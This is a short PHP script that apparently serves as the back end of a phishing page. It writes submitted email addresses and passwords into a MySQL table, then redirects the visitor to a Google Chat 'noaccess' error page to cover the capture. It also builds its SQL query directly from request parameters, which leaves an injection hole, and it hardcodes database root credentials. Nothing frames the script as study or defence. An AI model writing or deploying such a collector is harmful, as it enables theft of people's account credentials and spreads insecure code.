<?php
echo("<script>window.location.href='https://chat.google.com/error/noaccess?pli=1/'</script>");
$severname="localhost";
$username="root";
$password="1345";
$dbname="info";
$conn=mysqli_connect("$severname","$username","$password","$dbname");
var_dump($_POST);
$sql="
    INSERT INTO topic(email,pw)
    VALUES(
        '{$_GET['email']}',
        '{$_GET['pw']}'
    )

";
$result=mysqli_query($conn,$sql);
if($result===false){
    echo '저장하는도중 문제가생겻습니다.';
}
?>
